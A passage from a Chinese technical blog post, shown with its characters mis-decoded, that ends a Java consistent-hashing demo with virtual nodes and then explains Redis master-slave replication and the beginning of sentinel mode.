&#123;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//å¾…æ·»åŠ å…¥Hashç¯çš„æœåŠ¡å™¨åˆ—è¡¨</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> String[] servers = &#123;<span class="string">&quot;192.168.0.0:111&quot;</span>, <span class="string">&quot;192.168.0.1:111&quot;</span>, <span class="string">&quot;192.168.0.2:111&quot;</span>,</span><br><span class="line">             <span class="string">&quot;192.168.0.3:111&quot;</span>, <span class="string">&quot;192.168.0.4:111&quot;</span>&#125;;</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//çœŸå®ç»“ç‚¹åˆ—è¡¨,è€ƒè™‘åˆ°æœåŠ¡å™¨ä¸Šçº¿ã€ä¸‹çº¿çš„åœºæ™¯ï¼Œå³æ·»åŠ ã€åˆ é™¤çš„åœºæ™¯ä¼šæ¯”è¾ƒé¢‘ç¹ï¼Œè¿™é‡Œä½¿ç”¨LinkedListä¼šæ›´å¥½</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; realNodes = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;String&gt;();</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//è™šæ‹ŸèŠ‚ç‚¹ï¼Œkeyè¡¨ç¤ºè™šæ‹ŸèŠ‚ç‚¹çš„hashå€¼ï¼Œvalueè¡¨ç¤ºè™šæ‹ŸèŠ‚ç‚¹çš„åç§°</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> SortedMap&lt;Integer, String&gt; virtualNodes = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;Integer, String&gt;();</span><br><span class="line">             </span><br><span class="line">     <span class="comment">//è™šæ‹ŸèŠ‚ç‚¹çš„æ•°ç›®ï¼Œè¿™é‡Œå†™æ­»ï¼Œä¸ºäº†æ¼”ç¤ºéœ€è¦ï¼Œä¸€ä¸ªçœŸå®ç»“ç‚¹å¯¹åº”5ä¸ªè™šæ‹ŸèŠ‚ç‚¹</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">VIRTUAL_NODES</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">static</span>&#123;</span><br><span class="line">         <span class="comment">//å…ˆæŠŠåŸå§‹çš„æœåŠ¡å™¨æ·»åŠ åˆ°çœŸå®ç»“ç‚¹åˆ—è¡¨ä¸­</span></span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;servers.length; i++)</span><br><span class="line">             realNodes.add(servers[i]);</span><br><span class="line">         </span><br><span class="line">         <span class="comment">//å†æ·»åŠ è™šæ‹ŸèŠ‚ç‚¹ï¼Œéå†LinkedListä½¿ç”¨foreachå¾ªç¯æ•ˆç‡ä¼šæ¯”è¾ƒé«˜</span></span><br><span class="line">         <span class="keyword">for</span> (String str : realNodes)&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;VIRTUAL_NODES; i++)&#123;</span><br><span class="line">                 <span class="type">String</span> <span class="variable">virtualNodeName</span> <span class="operator">=</span> str + <span class="string">&quot;&amp;&amp;VN&quot;</span> + String.valueOf(i);</span><br><span class="line">                 <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> getHash(virtualNodeName);</span><br><span class="line">                 System.out.println(<span class="string">&quot;è™šæ‹ŸèŠ‚ç‚¹[&quot;</span> + virtualNodeName + <span class="string">&quot;]è¢«æ·»åŠ , hashå€¼ä¸º&quot;</span> + hash);</span><br><span class="line">                 virtualNodes.put(hash, virtualNodeName);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println();</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//ä½¿ç”¨FNV1_32_HASHç®—æ³•è®¡ç®—æœåŠ¡å™¨çš„Hashå€¼,è¿™é‡Œä¸ä½¿ç”¨é‡å†™hashCodeçš„æ–¹æ³•ï¼Œæœ€ç»ˆæ•ˆæœæ²¡åŒºåˆ«</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getHash</span><span class="params">(String str)</span>&#123;</span><br><span class="line">         <span class="keyword">final</span> <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">16777619</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> (<span class="type">int</span>)<span class="number">2166136261L</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">             hash = (hash ^ str.charAt(i)) * p;</span><br><span class="line">         hash += hash &lt;&lt; <span class="number">13</span>;</span><br><span class="line">         hash ^= hash &gt;&gt; <span class="number">7</span>;</span><br><span class="line">         hash += hash &lt;&lt; <span class="number">3</span>;</span><br><span class="line">         hash ^= hash &gt;&gt; <span class="number">17</span>;</span><br><span class="line">         hash += hash &lt;&lt; <span class="number">5</span>;</span><br><span class="line">         </span><br><span class="line">         <span class="comment">// å¦‚æœç®—å‡ºæ¥çš„å€¼ä¸ºè´Ÿæ•°åˆ™å–å…¶ç»å¯¹å€¼</span></span><br><span class="line">         <span class="keyword">if</span> (hash &lt; <span class="number">0</span>)</span><br><span class="line">             hash = Math.abs(hash);</span><br><span class="line">         <span class="keyword">return</span> hash;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//å¾—åˆ°åº”å½“è·¯ç”±åˆ°çš„ç»“ç‚¹</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getServer</span><span class="params">(String key)</span>&#123;</span><br><span class="line">        <span class="comment">//å¾—åˆ°è¯¥keyçš„hashå€¼</span></span><br><span class="line">         <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> getHash(key);</span><br><span class="line">         <span class="comment">// å¾—åˆ°å¤§äºè¯¥Hashå€¼çš„æ‰€æœ‰Map</span></span><br><span class="line">         SortedMap&lt;Integer, String&gt; subMap = virtualNodes.tailMap(hash);</span><br><span class="line">         String virtualNode;</span><br><span class="line">         <span class="keyword">if</span>(subMap.isEmpty())&#123;</span><br><span class="line">            <span class="comment">//å¦‚æœæ²¡æœ‰æ¯”è¯¥keyçš„hashå€¼å¤§çš„ï¼Œåˆ™ä»ç¬¬ä¸€ä¸ªnodeå¼€å§‹</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> virtualNodes.firstKey();</span><br><span class="line">            <span class="comment">//è¿”å›å¯¹åº”çš„æœåŠ¡å™¨</span></span><br><span class="line">            virtualNode = virtualNodes.get(i);</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//ç¬¬ä¸€ä¸ªKeyå°±æ˜¯é¡ºæ—¶é’ˆè¿‡å»ç¦»nodeæœ€è¿‘çš„é‚£ä¸ªç»“ç‚¹</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> subMap.firstKey();</span><br><span class="line">            <span class="comment">//è¿”å›å¯¹åº”çš„æœåŠ¡å™¨</span></span><br><span class="line">            virtualNode = subMap.get(i);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//virtualNodeè™šæ‹ŸèŠ‚ç‚¹åç§°è¦æˆªå–ä¸€ä¸‹</span></span><br><span class="line">         <span class="keyword">if</span>(StringUtils.isNotBlank(virtualNode))&#123;</span><br><span class="line">             <span class="keyword">return</span> virtualNode.substring(<span class="number">0</span>, virtualNode.indexOf(<span class="string">&quot;&amp;&amp;&quot;</span>));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         String[] keys = &#123;<span class="string">&quot;å¤ªé˜³&quot;</span>, <span class="string">&quot;æœˆäº®&quot;</span>, <span class="string">&quot;æ˜Ÿæ˜Ÿ&quot;</span>&#125;;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;keys.length; i++)</span><br><span class="line">             System.out.println(<span class="string">&quot;[&quot;</span> + keys[i] + <span class="string">&quot;]çš„hashå€¼ä¸º&quot;</span> +</span><br><span class="line">                     getHash(keys[i]) + <span class="string">&quot;, è¢«è·¯ç”±åˆ°ç»“ç‚¹[&quot;</span> + getServer(keys[i]) + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<h2 id="Redisé«˜å¯ç”¨ï¼ˆä¸»ä»ã€å“¨å…µã€é›†ç¾¤ï¼‰"><a href="#Redisé«˜å¯ç”¨ï¼ˆä¸»ä»ã€å“¨å…µã€é›†ç¾¤ï¼‰" class="headerlink" title="Redisé«˜å¯ç”¨ï¼ˆä¸»ä»ã€å“¨å…µã€é›†ç¾¤ï¼‰"></a>Redisé«˜å¯ç”¨ï¼ˆä¸»ä»ã€å“¨å…µã€é›†ç¾¤ï¼‰</h2><h3 id="ä¸»ä»æ¨¡å¼"><a href="#ä¸»ä»æ¨¡å¼" class="headerlink" title="ä¸»ä»æ¨¡å¼"></a>ä¸»ä»æ¨¡å¼</h3><p>ä¸€èˆ¬ï¼Œç³»ç»Ÿçš„é«˜å¯ç”¨éƒ½æ˜¯é€šè¿‡éƒ¨ç½²å¤šå°æœºå™¨å®ç°çš„ã€‚redis ä¸ºäº†é¿å…å•ç‚¹æ•…éšœï¼Œä¹Ÿéœ€è¦éƒ¨ç½²å¤šå°æœºå™¨ã€‚</p>
<p>å› ä¸ºéƒ¨ç½²äº†å¤šå°æœºå™¨ï¼Œæ‰€ä»¥å°±ä¼šæ¶‰åŠåˆ°ä¸åŒæœºå™¨çš„çš„æ•°æ®åŒæ­¥é—®é¢˜ã€‚ä¸ºæ­¤ï¼Œredis æä¾›äº† Redis æä¾›äº†å¤åˆ¶(replication)åŠŸèƒ½ï¼Œå½“ä¸€å° redis æ•°æ®åº“ä¸­çš„æ•°æ®å‘ç”Ÿäº†å˜åŒ–ï¼Œè¿™ä¸ªå˜åŒ–ä¼šè¢«è‡ªåŠ¨çš„åŒæ­¥åˆ°å…¶ä»–çš„ redis æœºå™¨ä¸Šå»ã€‚</p>
<p>redis å¤šæœºå™¨éƒ¨ç½²æ—¶ï¼Œè¿™äº›æœºå™¨èŠ‚ç‚¹ä¼šè¢«åˆ†æˆä¸¤ç±»ï¼Œä¸€ç±»æ˜¯ä¸»èŠ‚ç‚¹ï¼ˆmaster èŠ‚ç‚¹ï¼‰ï¼Œä¸€ç±»æ˜¯ä»èŠ‚ç‚¹ï¼ˆslave èŠ‚ç‚¹ï¼‰ã€‚ä¸€èˆ¬ä¸»èŠ‚ç‚¹å¯ä»¥è¿›è¡Œè¯»ã€å†™æ“ä½œï¼Œè€Œä»èŠ‚ç‚¹åªèƒ½è¿›è¡Œè¯»æ“ä½œã€‚åŒæ—¶ç”±äºä¸»èŠ‚ç‚¹å¯ä»¥å†™ï¼Œæ•°æ®ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå½“ä¸»èŠ‚ç‚¹çš„æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šå°†å˜åŒ–çš„æ•°æ®åŒæ­¥ç»™ä»èŠ‚ç‚¹ï¼Œè¿™æ ·ä»èŠ‚ç‚¹çš„æ•°æ®å°±å¯ä»¥å’Œä¸»èŠ‚ç‚¹çš„æ•°æ®ä¿æŒä¸€è‡´äº†ã€‚ä¸€ä¸ªä¸»èŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªä»èŠ‚ç‚¹ï¼Œä½†æ˜¯ä¸€ä¸ªä»èŠ‚ç‚¹ä¼šåªä¼šæœ‰ä¸€ä¸ªä¸»èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„ä¸€ä¸»å¤šä»ç»“æ„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282331731.png" alt="img"></p>
<h4 id="æœºå™¨è§„åˆ’"><a href="#æœºå™¨è§„åˆ’" class="headerlink" title="æœºå™¨è§„åˆ’"></a>æœºå™¨è§„åˆ’</h4><table>
<thead>
<tr>
<th>æœºå™¨åç§°</th>
<th>IP</th>
<th>ç«¯å£</th>
</tr>
</thead>
<tbody><tr>
<td>master</td>
<td>192.168.1.10</td>
<td>6379</td>
</tr>
<tr>
<td>slave1</td>
<td>192.168.1.11</td>
<td>6379</td>
</tr>
<tr>
<td>slave2</td>
<td>192.168.1.12</td>
<td>6379</td>
</tr>
<tr>
<td>slave3</td>
<td>192.168.1.13</td>
<td>6379</td>
</tr>
</tbody></table>
<h4 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h4><p><strong>ä¸»èŠ‚ç‚¹é…ç½®</strong></p>
<p>ä¸»èŠ‚ç‚¹æŒ‰ç…§æ­£å¸¸çš„é…ç½®é…å¥½å³å¯ã€‚</p>
<p><strong>ä»èŠ‚ç‚¹é…ç½®</strong></p>
<p>ä½¿ç”¨é»˜è®¤çš„é…ç½®å¯åŠ¨æœºå™¨ï¼Œæœºå™¨éƒ½æ˜¯ä¸»èŠ‚ç‚¹ã€‚å¦‚æœæƒ³è¦è®©æœºå™¨å˜æˆä»èŠ‚ç‚¹ï¼Œéœ€è¦åœ¨ conf æœåŠ¡å™¨ä¸Šé…ç½®ä¸»ä»å¤åˆ¶çš„ç›¸å…³å‚æ•°ã€‚</p>
<ul>
<li>åœ¨ä»èŠ‚ç‚¹çš„é…ç½®æ–‡ä»¶ redis.conf ä¸­æŒ‡å®šä¸»èŠ‚ç‚¹çš„ä¿¡æ¯ï¼ˆå¦‚æœéœ€è¦çš„è¯ï¼Œå¯ä»¥é…ç½®ä¸»èŠ‚ç‚¹çš„ç™»å½•å¯†ç ï¼Œä¸»ä»å¤åˆ¶ç›¸å…³çš„å‚æ•°ï¼‰ã€‚ä¸‰å°ä»èŠ‚ç‚¹çš„é…ç½®æ˜¯ä¸€æ ·çš„ã€‚</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">é…ç½®ä¸»èŠ‚ç‚¹çš„ipå’Œç«¯å£</span></span><br><span class="line">slaveof 192.168.1.10 6379</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä»redis2.6å¼€å§‹ï¼Œä»èŠ‚ç‚¹é»˜è®¤æ˜¯åªè¯»çš„</span></span><br><span class="line">slave-read-only yes</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å‡è®¾ä¸»èŠ‚ç‚¹æœ‰ç™»å½•å¯†ç ï¼Œæ˜¯123456</span></span><br><span class="line">masterauth 123456</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¹Ÿå¯ä»¥ä¸é…ç½®ä¸Šé¢çš„æ–‡ä»¶ï¼Œä½¿ç”¨ redis-server å‘½ä»¤ï¼Œåœ¨å¯åŠ¨ä»èŠ‚ç‚¹æ—¶ï¼Œé€šè¿‡å‚æ•°â€“slaveof æŒ‡å®šä¸»èŠ‚ç‚¹æ˜¯è°ã€‚</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./redis-server --slaveof 192.168.1.10 6379</span><br></pre></td></tr></table></figure>

<p>ç³»ç»Ÿè¿è¡Œæ—¶ï¼Œå¦‚æœ master æŒ‚æ‰äº†ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªä»åº“ï¼ˆå¦‚ slave1ï¼‰ä¸Šæ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤<code>slaveof no one</code>ï¼Œå°† slave1 å˜æˆæ–°çš„ masterï¼›åœ¨ slave2 å’Œ slave3 ä¸Šåˆ†åˆ«æ‰§è¡Œ<code>slaveof 192.168.1.11 6379</code> å°†è¿™ä¸¤ä¸ªæœºå™¨çš„ä¸»èŠ‚ç‚¹æŒ‡å‘çš„è¿™ä¸ªæ–°çš„ masterï¼›åŒæ—¶ï¼ŒæŒ‚æ‰çš„åŸ master å¯åŠ¨åä½œä¸ºæ–°çš„ slave ä¹ŸæŒ‡å‘æ–°çš„ master ä¸Šã€‚</p>
<p>æ‰§è¡Œå‘½ä»¤<code>slaveof no one</code>å‘½ä»¤ï¼Œå¯ä»¥å…³é—­ä»æœåŠ¡å™¨çš„å¤åˆ¶åŠŸèƒ½ã€‚åŒæ—¶åŸæ¥åŒæ­¥çš„æ‰€å¾—çš„æ•°æ®é›†éƒ½ä¸ä¼šè¢«ä¸¢å¼ƒã€‚</p>
<h4 id="æœºå™¨å¯åŠ¨"><a href="#æœºå™¨å¯åŠ¨" class="headerlink" title="æœºå™¨å¯åŠ¨"></a>æœºå™¨å¯åŠ¨</h4><p>é¦–å…ˆå¯åŠ¨ä¸»èŠ‚ç‚¹ï¼Œç„¶åä¸€å°ä¸€å°å¯åŠ¨ä»èŠ‚ç‚¹ã€‚</p>
<h4 id="ä¸»ä»å¤åˆ¶çš„æœºåˆ¶"><a href="#ä¸»ä»å¤åˆ¶çš„æœºåˆ¶" class="headerlink" title="ä¸»ä»å¤åˆ¶çš„æœºåˆ¶"></a>ä¸»ä»å¤åˆ¶çš„æœºåˆ¶</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282332056.png" alt="img"></p>
<ul>
<li>ä»æ•°æ®åº“è¿æ¥ä¸»æ•°æ®åº“ï¼Œå‘é€ SYNC å‘½ä»¤ã€‚</li>
<li>ä¸»æ•°æ®åº“æ¥æ”¶åˆ° SYNC å‘½ä»¤åï¼Œå¯ä»¥æ‰§è¡Œ BGSAVE å‘½ä»¤ç”Ÿæˆ RDB æ–‡ä»¶å¹¶ä½¿ç”¨ç¼“å†²åŒºè®°å½•æ­¤åæ‰§è¡Œçš„æ‰€æœ‰å†™å‘½ä»¤ã€‚</li>
<li>ä¸»æ•°æ®åº“ BGSAVE æ‰§è¡Œå®Œåï¼Œå‘æ‰€æœ‰ä»æ•°æ®åº“å‘é€å¿«ç…§æ–‡ä»¶ï¼Œå¹¶åœ¨å‘é€æœŸé—´ç»§ç»­è®°å½•è¢«æ‰§è¡Œçš„å†™å‘½ä»¤ã€‚</li>
<li>ä»æ•°æ®åº“æ”¶åˆ°å¿«ç…§æ–‡ä»¶åä¸¢å¼ƒæ‰€æœ‰æ—§æ•°æ®ï¼Œè½½å…¥æ”¶åˆ°çš„å¿«ç…§ã€‚</li>
<li>ä¸»æ•°æ®åº“å¿«ç…§å‘é€å®Œæ¯•åå¼€å§‹å‘ä»æ•°æ®åº“å‘é€ç¼“å†²åŒºä¸­çš„å†™å‘½ä»¤ã€‚</li>
<li>ä»æ•°æ®åº“å®Œæˆå¯¹å¿«ç…§çš„è½½å…¥ï¼Œå¼€å§‹æ¥å—å‘½ä»¤è¯·æ±‚ï¼Œå¹¶æ‰§è¡Œæ¥è‡ªä¸»æ•°æ®åº“ç¼“å†²åŒºçš„å†™å‘½ä»¤ã€‚(<strong>ä»æ•°æ®åº“åˆå§‹åŒ–å®Œæˆ</strong>)</li>
<li>ä¸»æ•°æ®åº“æ¯æ‰§è¡Œä¸€ä¸ªå†™å‘½ä»¤å°±ä¼šå‘ä»æ•°æ®åº“å‘é€ç›¸åŒçš„å†™å‘½ä»¤ï¼Œä»æ•°æ®åº“æ¥æ”¶å¹¶æ‰§è¡Œæ”¶åˆ°çš„å†™å‘½ä»¤ã€‚(<strong>ä»æ•°æ®åº“åˆå§‹åŒ–å®Œæˆåçš„æ“ä½œ</strong>)</li>
<li>å‡ºç°æ–­å¼€é‡è¿åï¼Œ2.8 ä¹‹åçš„ç‰ˆæœ¬ä¼šå°†æ–­çº¿æœŸé—´çš„å‘½ä»¤ä¼ ç»™ä»æ•°æ®åº“ï¼Œå¢é‡å¤åˆ¶ã€‚</li>
<li><strong>ä¸»ä»åˆšåˆšè¿æ¥çš„æ—¶å€™ï¼Œè¿›è¡Œå…¨é‡åŒæ­¥ã€‚å…¨åŒæ­¥ç»“æŸåï¼Œè¿›è¡Œå¢é‡åŒæ­¥</strong>ã€‚å½“ç„¶ï¼Œå¦‚æœæœ‰éœ€è¦ï¼Œslave åœ¨ä»»ä½•æ—¶å€™éƒ½å¯ä»¥å‘èµ·å…¨é‡åŒæ­¥ã€‚Redis çš„ç­–ç•¥æ˜¯ï¼Œæ— è®ºå¦‚ä½•ï¼Œé¦–å…ˆä¼šå°è¯•è¿›è¡Œå¢é‡åŒæ­¥ï¼Œå¦‚ä¸æˆåŠŸï¼Œè¦æ±‚ä»æœºè¿›è¡Œå…¨é‡åŒæ­¥ã€‚</li>
</ul>
<h4 id="ä¸»ä»æ¨¡å¼çš„ä¼˜ç¼ºç‚¹"><a href="#ä¸»ä»æ¨¡å¼çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¸»ä»æ¨¡å¼çš„ä¼˜ç¼ºç‚¹"></a>ä¸»ä»æ¨¡å¼çš„ä¼˜ç¼ºç‚¹</h4><h5 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h5><ul>
<li>æ”¯æŒä¸»ä»å¤åˆ¶ï¼Œä¸»æœºä¼šè‡ªåŠ¨å°†æ•°æ®åŒæ­¥åˆ°ä»æœºï¼Œå¯ä»¥è¿›è¡Œè¯»å†™åˆ†ç¦»;</li>
<li>ä¸ºäº†åˆ†è½½ Master çš„è¯»æ“ä½œå‹åŠ›ï¼ŒSlave æœåŠ¡å™¨å¯ä»¥ä¸ºå®¢æˆ·ç«¯æä¾›åªè¯»æ“ä½œçš„æœåŠ¡ï¼Œå†™æœåŠ¡ä¾ç„¶å¿…é¡»ç”± Master æ¥å®Œæˆ;</li>
<li>Slave åŒæ ·å¯ä»¥æ¥å—å…¶ä»– Slaves çš„è¿æ¥å’ŒåŒæ­¥è¯·æ±‚ï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆåœ°åˆ†è½½ Master çš„åŒæ­¥å‹åŠ›;</li>
<li>Master æ˜¯ä»¥éé˜»å¡çš„æ–¹å¼ä¸º Slaves æä¾›æœåŠ¡ã€‚æ‰€ä»¥åœ¨ Master-Slave åŒæ­¥æœŸé—´ï¼Œå®¢æˆ·ç«¯ä»ç„¶å¯ä»¥æäº¤æŸ¥è¯¢æˆ–ä¿®æ”¹è¯·æ±‚;</li>
<li>Slave åŒæ ·æ˜¯ä»¥éé˜»å¡çš„æ–¹å¼å®Œæˆæ•°æ®åŒæ­¥ã€‚åœ¨åŒæ­¥æœŸé—´ï¼Œå¦‚æœæœ‰å®¢æˆ·ç«¯æäº¤æŸ¥è¯¢è¯·æ±‚ï¼ŒRedis åˆ™è¿”å›åŒæ­¥ä¹‹å‰çš„æ•°æ®ã€‚</li>
</ul>
<h5 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5><ul>
<li>Redis ä¸å…·å¤‡è‡ªåŠ¨å®¹é”™å’Œæ¢å¤åŠŸèƒ½ï¼Œä¸»æœºä»æœºçš„å®•æœºéƒ½ä¼šå¯¼è‡´å‰ç«¯éƒ¨åˆ†è¯»å†™è¯·æ±‚å¤±è´¥ï¼Œéœ€è¦ç­‰å¾…æœºå™¨é‡å¯æˆ–è€…æ‰‹åŠ¨åˆ‡æ¢å‰ç«¯çš„ IP æ‰èƒ½æ¢å¤ã€‚</li>
<li>ä¸»æœºå®•æœºï¼Œå®•æœºå‰æœ‰éƒ¨åˆ†æ•°æ®æœªèƒ½åŠæ—¶åŒæ­¥åˆ°ä»æœºï¼Œåˆ‡æ¢ IP åè¿˜ä¼šå¼•å…¥æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œé™ä½äº†ç³»ç»Ÿçš„å¯ç”¨æ€§ã€‚</li>
<li>å¦‚æœå¤šä¸ª Slave æ–­çº¿äº†ï¼Œéœ€è¦é‡å¯çš„æ—¶å€™ï¼Œå°½é‡ä¸è¦åœ¨åŒä¸€æ—¶é—´æ®µè¿›è¡Œé‡å¯ã€‚å› ä¸ºåªè¦ Slave å¯åŠ¨ï¼Œå°±ä¼šå‘é€ sync è¯·æ±‚å’Œä¸»æœºå…¨é‡åŒæ­¥ï¼Œå½“å¤šä¸ª Slave é‡å¯çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå¯¼è‡´ Master IO å‰§å¢ä»è€Œå®•æœºã€‚</li>
<li>Redis è¾ƒéš¾æ”¯æŒåœ¨çº¿æ‰©å®¹ï¼Œåœ¨é›†ç¾¤å®¹é‡è¾¾åˆ°ä¸Šé™æ—¶åœ¨çº¿æ‰©å®¹ä¼šå˜å¾—å¾ˆå¤æ‚ã€‚</li>
<li>Redis çš„ä¸»èŠ‚ç‚¹å’Œä»èŠ‚ç‚¹ä¸­çš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œé™ä½äº†å†…å­˜çš„å¯ç”¨æ€§ã€‚</li>
</ul>
<h3 id="å“¨å…µæ¨¡å¼"><a href="#å“¨å…µæ¨¡å¼" class="headerlink" title="å“¨å…µæ¨¡å¼"></a>å“¨å…µæ¨¡å¼</h3><p>ä¸»ä»æ¨¡å¼ä¸‹ï¼Œå½“ä¸»æœåŠ¡å™¨å®•æœºåï¼Œéœ€è¦æ‰‹åŠ¨æŠŠä¸€å°ä»æœåŠ¡å™¨åˆ‡æ¢ä¸ºä¸»æœåŠ¡å™¨ï¼Œè¿™å°±éœ€è¦äººå·¥å¹²é¢„ï¼Œè´¹äº‹è´¹åŠ›ï¼Œè¿˜ä¼šé€ æˆä¸€æ®µæ—¶é—´å†…æœåŠ¡ä¸å¯ç”¨ã€‚è¿™ç§æ–¹å¼å¹¶ä¸æ¨èï¼Œå®é™…ç”Ÿäº§ä¸­ï¼Œä¼˜å…ˆè€ƒè™‘å“¨å…µæ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ä¸‹ï¼Œmaster å®•æœºï¼Œå“¨å…µä¼šè‡ªåŠ¨é€‰ä¸¾ master å¹¶å°†å…¶ä»–çš„ slave æŒ‡å‘æ–°çš„ masterã€‚</p>
<p>åœ¨ä¸»ä»æ¨¡å¼ä¸‹ï¼ŒRedis åŒæ—¶æä¾›äº†å“¨å…µå‘½ä»¤<code>redis-sentinel</code>ï¼Œå“¨å…µæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼Œä½œä¸ºè¿›ç¨‹ï¼Œå®ƒä¼šç‹¬ç«‹è¿è¡Œã€‚å…¶åŸç†æ˜¯å“¨å…µè¿›ç¨‹å‘æ‰€æœ‰çš„ Redis æœºå™¨å‘é€å‘½ä»¤ï¼Œç­‰å¾… Redis æœåŠ¡å™¨å“åº”ï¼Œä»è€Œç›‘æ§è¿è¡Œçš„å¤šä¸ª Redis å®ä¾‹ã€‚</p>
<p>å“¨å…µå¯ä»¥æœ‰å¤šä¸ªï¼Œä¸€èˆ¬ä¸ºäº†ä¾¿äºå†³ç­–é€‰ä¸¾ï¼Œä½¿ç”¨å¥‡æ•°ä¸ªå“¨å…µã€‚å“¨å…µå¯ä»¥å’Œ Redis æœºå™¨éƒ¨ç½²åœ¨ä¸€èµ·ï¼Œä¹Ÿå¯ä»¥éƒ¨ç½²åœ¨å…¶ä»–çš„æœºå™¨ä¸Šã€‚å¤šä¸ªå“¨å…µæ„æˆä¸€ä¸ªå“¨å…µé›†ç¾¤ï¼Œå“¨å…µç›´æ¥ä¹Ÿä¼šç›¸äº’é€šä¿¡ï¼Œæ£€æŸ¥å“¨å…µæ˜¯å¦æ­£å¸¸è¿è¡Œï¼ŒåŒæ—¶å‘ç° master å®•æœºå“¨å…µä¹‹é—´ä¼šè¿›è¡Œå†³ç­–é€‰ä¸¾æ–°çš„ masterã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282332575.png" alt="img"></p>
<p>å“¨å…µæ¨¡å¼çš„ä½œç”¨:</p>
<ul>
<li>é€šè¿‡å‘é€å‘½ä»¤ï¼Œè®© Redis æœåŠ¡å™¨è¿”å›ç›‘æ§å…¶è¿è¡ŒçŠ¶æ€ï¼ŒåŒ…æ‹¬ä¸»æœåŠ¡å™¨å’Œä»æœåŠ¡å™¨ã€‚</li>
<li>å½“å“¨å…µç›‘æµ‹åˆ° master å®•æœºï¼Œä¼šè‡ªåŠ¨å°† slave åˆ‡æ¢åˆ° masterï¼Œç„¶åé€šè¿‡å‘å¸ƒè®¢é˜…æ¨¡å¼é€šçŸ¥å…¶ä»–çš„ä»æœåŠ¡å™¨ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè®©å®ƒä»¬åˆ‡æ¢ä¸»æœºã€‚</li>
